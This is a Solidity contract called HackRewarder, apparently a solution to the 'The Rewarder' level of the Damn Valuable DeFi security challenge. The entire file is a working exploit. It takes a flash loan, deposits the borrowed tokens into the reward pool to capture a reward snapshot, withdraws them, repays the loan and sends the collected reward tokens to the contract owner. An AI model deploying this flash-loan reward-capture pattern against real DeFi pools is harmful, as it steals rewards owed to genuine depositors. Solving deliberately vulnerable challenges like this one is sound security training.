pragma solidity ^0.6.0;


import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract HackRewarder {

	TheRewarderPool public theRewarderPool;
    DamnValuableToken public liquidityToken;
    FlashLoanerPool public flashLoanerPool;
    RewardToken public rewardToken;
    address public owner;

	constructor(address poolAddress, 
				address tokenAddress,
				address flashLoanerAddress,
				address rewardTokenAddress) public {
		theRewarderPool = TheRewarderPool(poolAddress);
		liquidityToken = DamnValuableToken(tokenAddress);
		flashLoanerPool = FlashLoanerPool(flashLoanerAddress);
		rewardToken = RewardToken(rewardTokenAddress);
		owner = msg.sender;
	}

	function receiveFlashLoan(uint256 amount) public {
		liquidityToken.approve(address(theRewarderPool), amount);
		theRewarderPool.deposit(amount);
		theRewarderPool.withdraw(amount);
		liquidityToken.transfer(msg.sender, amount);
		rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
	}

	function makeFlashLoan(uint256 amount) public {
		flashLoanerPool.flashLoan(amount);
	}
}